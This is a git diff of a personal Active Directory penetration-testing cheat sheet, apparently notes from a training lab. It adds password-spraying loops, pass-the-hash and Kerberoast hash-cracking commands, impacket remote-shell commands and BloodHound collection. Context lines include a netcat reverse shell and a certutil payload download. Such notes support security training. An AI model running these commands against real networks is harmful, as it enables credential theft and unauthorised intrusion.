@@ -38,6 +38,8 @@
   - [GetUserSPNs.py](#getuserspnspy)
 
 ---
+# Read
+- [MS Docs - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
 
 # Tools
 https://github.com/GhostPack/Seatbelt  
@@ -51,6 +53,7 @@ https://pypi.org/project/requests-ntlm/
 # URLs
 https://zsh-prompt-generator.site/
 https://bash-prompt-generator.org/
+https://wadcoms.github.io/
 
 - shell
 https://explainshell.com/
@@ -88,7 +91,7 @@ https://github.com/Orange-Cyberdefense/GOAD
 
 # OSINT
 - https://haveibeenpwned.com/
-- https://www.dehashed.com/
+
 ## spiderfoot
 https://github.com/smicallef/spiderfoot
 
@@ -120,13 +123,37 @@ $ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
 ```
 
 ---
+# Google
+```
+filetype:pdf inurl:hoge.com
+```
+```
+intext:"@hoge.com" inurl:hoge.com
+```
+# nslookup
+```zsh
+$ nslookup ns1.hoge.com
+```
+
+# dehashed
+- https://www.dehashed.com/
+```zsh
+$ python3 dehashed.py -q hoge.local -p
+```
+
+# statistically-likely-usernames
+tag: list
+https://github.com/insidetrust/statistically-likely-usernames
+
+# Exploit DB
+https://www.exploit-db.com/
 
 # Hashcat
 tag: Misc
 https://hashcat.net/wiki/doku.php?id=example_hashes 
 ```zsh
-$ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
-$ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
+$ hashcat -m 13100 TestUser_tgs /usr/share/wordlists/rockyou.txt
+$ hashcat -m 5600 TestUser_ntlmv2 /usr/share/wordlists/rockyou.txt
 $ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
 $ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
@@ -158,6 +185,7 @@ $ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
 
 # ssh
 ```zsh
+$ ssh TestUser@XXX.XXX.XXX.XXX
 $ ssh HOGE.com\\TestUser@TestHost.HOGE.com
 $ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
 ```
@@ -188,9 +216,11 @@ $ sudo nmap -sV -sC -p 0-10000 172.16.5.5
 $ sudo nmap -A -p- 172.16.5.5
 $ sudo nmap -sV -p- 172.16.5.130
 $ sudo nmap -sV -p- 172.16.5.225
+$ sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
 ```
 
 # fping
+tag: ICMP
 ```zsh
 $ fping -asgq 172.16.5.0/23
 ```
@@ -251,6 +281,75 @@ $ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l
 -4: IPv4
 ```
 
+# ldapsearch
+tag: LDAP
+```zsh
+$ ldapsearch -h 172.16.5.5 -x -b "DC=HOGE,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+# windapsearch
+tag: LDAP
+```zsh
+$ ./windapsearch.py -h
+$ ./windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u "" -U
+$ python3 windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestSpnAccountUser -p TestSpnAccountPassword -PU
+$ python3 windapsearch.py --dc-ip XXX.XXX.XXX.XXX -u TestUser@hoge.local -p TestPassword --da
+```
+
+# CrackMapExec
+tag: SMB
+```zsh
+$ crackmapexec smb -h
+$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
+$ crackmapexec smb XXX.XXX.XXX.XXX --users
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --users
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --loggedon-users
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --shares
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword  -M spider_plus --share 'Test Shares'
+$ head -n 10 /tmp/cme_spider_plus/XXX.XXX.XXX.XXX.json
+$ set +H
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
+$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u valid_users.txt -p TestPasseord | grep +
+$ sudo crackmapexec smb --local-auth XXX.XXX.XXX.XXX/23 -u administrator -H TestNTLMhash | grep +
+```
+
+# smbmap
+tag: SMB, Share
+```zsh
+$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
+$ smbmap -u TestUser -p TestPassword -d HOGE.LOCAL -H XXX.XXX.XXX.XXX -R 'Test Shares' --dir-only
+```
+
+
+# kerbrute
+tag: Enumerating Users
+```zsh
+$ kerbrute userenum -d HOGE.local --dc 172.16.0.10 mylist.txt -o valid_ad_users
+# $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
+$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
+$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
+$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
+$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
+# password spray
+$ kerbrute passwordspray -d hoge.local --dc XXX.XXX.XXX.XXX valid_users.txt TestPassword
+```
+
+# DomainPasswordSpray
+```powershell
+PS > Import-Module .\DomainPasswordSpray.ps1
+PS > Invoke-DomainPasswordSpray -Password TestPassword -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+# LAPSToolkit
+https://github.com/leoloobeek/LAPSToolkit/tree/master
+```powershell
+PS> Find-LAPSDelegatedGroups
+PS> Find-AdmPwdExtendedRights
+PS> Get-LAPSComputers
+```
+
 # Windows Built-In
 ```powershell
 # one line
@@ -274,9 +373,7 @@ PS> tree c:\ /f | Select-String "TestString" -context 20, 10
 # Enumerating Security Controls
 PS> Get-MpComputerStatus
 PS> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-PS> Find-LAPSDelegatedGroups
-PS> Find-AdmPwdExtendedRights
-PS> Get-LAPSComputers
+PS> $ExecutionContext.SessionState.LanguageMode
 # create credential
 PS> $username = 'TestAdminUser'
 PS> $password = 'TestAdminPassword'
@@ -363,18 +460,28 @@ PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX
 ```
 ## Import-Module ActiveDirectory
 ```powershell
+PS> Get-Module
 PS> Import-Module ActiveDirectory
+PS> Get-Module
+# Domain
+PS> Get-ADDomain
 # User
 PS> Get-ADUser -Identity TestUser -Properties *
 PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 # Group
+PS> Get-ADGroup -Filter * | select name
+PS> Get-ADGroup -Identity "Backup Operators"
 PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
+PS> Get-ADGroupMember -Identity "Backup Operators"
 # Change Password
 PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
 PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
 # Active Directory Object
 PS> $ChangeDate = New-Object DateTime(2024, 01, 24, 12, 00, 00)
 PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server HOGE.com
+# Trust
+PS> Get-ADTrust -Filter *
 ```
 
 ## sc.exe
@@ -390,11 +497,14 @@ PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
 ## net.exe
 ```zsh
 $ net use \\DC01\ipc$ "" /u:""
+$ net use \\DC01\ipc$ "" /u:TestUser
+$ net use \\DC01\ipc$ "TestPassword" /u:TestUser
 $ net user %username%
 $ net user /domain
 $ net user TestUser /domain
 $ net group /domain
 $ net group "TestGroup" /domain
+$ net accounts
 $ net accounts /domain
 ```
 
@@ -408,9 +518,13 @@ PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```powershell
 PS> Import-Module .\PowerView.ps1
+PS> Get-DomainPolicy
 # User
+PS> Get-DomainUser -Identity TestUser -Domain hoge.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 # Group
+PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 PS> Get-DomainGroup -Identity "TestGroup" | select memberof
 # ACL
 PS> Find-InterestingDomainAcl
@@ -418,6 +532,15 @@ PS> $TestUserSid = Convert-NameToSid TestUser
 PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid} -Verbose
 PS> $TestGroupSid = Convert-NameToSid "TestGroup"
 PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $TestGroupSid}
+# Trust
+PS> Get-DomainTrustMapping
+PS> Test-AdminAccess -ComputerName TestHostDC
+```
+
+# SharpView
+```powershell
+PS> .\SharpView.exe Get-DomainUser -Help
+PS> .\SharpView.exe Get-DomainUser -Identity TestUser
 ```
 
 # Metasploit
@@ -505,29 +628,8 @@ sync         x  4     65534  sync               /bin         /bin/sync
 mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
 ```
 
-# Internal Password Spraying - from Windows
-PS > Import-Module .\DomainPasswordSpray.ps1
-PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
-
-# BloodHound  
-```powershell
-PS> BloodHound.exe
-# On GUI
-## Upload Data ... zip file
-## Check ... Analysis Tab
-```
-## SharpHound
-```powershell
-PS> .\SharpHound.exe -c All --zipfilename hoge
-PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
-```
-## BloodHound.py
-```zsh
-$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns 172.16.5.6 -d hoge.com -c all
-```
-
 # Snaffer  
-tag: scan
+tag: scan, Share
 https://github.com/SnaffCon/Snaffler  
 ```powershell
 PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
@@ -552,7 +654,10 @@ https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/
 ```zsh
 $ rpcclient -U "" -N XXX.XXX.XXX.XXX
 rpcclient $> querydominfo
+rpcclient $> getdompwinfo
 rpcclient $> enumdomusers
+rpcclient $> queryuser 0x457
+rpcclient $> queryuser (RID(hex))
 $ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
 $ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
 $ grep Intern a.txt
@@ -560,14 +665,8 @@ group:[Interns] rid:[0xff0]
 $
 $ echo $((16#ff0))
 4080
-$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.0.10 | grep Authority; done
-```
-
-# smbmap
-https://github.com/ShawnDEvans/smbmap  
-SMB share enumeration across a domain. |  
-```zsh
-$ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
+# password spray
+$ for u in $(cat valid_users.txt);do rpcclient -U "$u%TestPassword" -c "getusername;quit" 172.16.0.10 | grep Authority; done
 ```
 
 # setspn
@@ -678,28 +777,6 @@ PS> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 PS> .\Inveigh.exe
 ```
 
-# kerbrute
-tag: Enumerating Users
-```zsh
-$ kerbrute userenum -d HOGE.com --dc 172.16.0.10 mylist.txt -o valid_ad_users
-# $ sudo echo 1721.16.0.10 HOGE.com >> /etc/hosts
-$ kerbrute userenum --dc HOGE.com -d HOGE.com ./userlist.txt
-$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt
-$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt
-$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt
-```
-
-# crackmapexec
-tag: Sighting In, Hunting For A User
-```zsh
-$ crackmapexec smb -h
-$ crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --pass-pol
-$ crackmapexec smb XXX.XXX.XXX.XXX --users
-$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword
-$ set +H
-$ sudo crackmapexec smb XXX.XXX.XXX.XXX -u TestUser -p TestPassword --groups
-```
-
 # impacket
 ## GetNPUsers.py
 ```zsh
@@ -736,24 +813,36 @@ tag: shell
 $ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
 $ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
 ```
+## wmiexec.py
+```zsh
+$ wmiexec.py hoge.local/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
+```
 
 # Evil-WinRM
 ```zsh
 $ evil-winrm -i HOGE.com -u TestUser -H TestNTHash
 ```
 
-# ldapsearch
-tag: LDAP
-```zsh
-$ ldapsearch -h 172.16.0.10 -x -b "DC=HOGE,DC=COM" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+# BloodHound  
+https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+```powershell
+PS> BloodHound.exe
+# On GUI
+## Upload Data ... zip file
+## Check ... Analysis Tab
 ```
-
-# windapsearch
-tag: LDAP
+## SharpHound
+```powershell
+PS> .\SharpHound.exe -c All --zipfilename hoge
+PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
+```
+## BloodHound.py
 ```zsh
-$ ./windapsearch.py -h
-$ ./windapsearch.py --dc-ip 172.16.0.10 -u "" -U
-$ python3 windapsearch.py --dc-ip 172.16.5.5 -u TestSpnAccountUser -p TestSpnAccountPassword -PU
+$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
+$ sudo bloodhound-python -u 'TestUser' -p 'TestPassword' -ns XXX.XXX.XXX.XXX -d hoge.local -c all
+$ ls
+$ zip -r hoge_bh.zip *.json
+$ sudo neo4j start
 ```
 
 # noPac
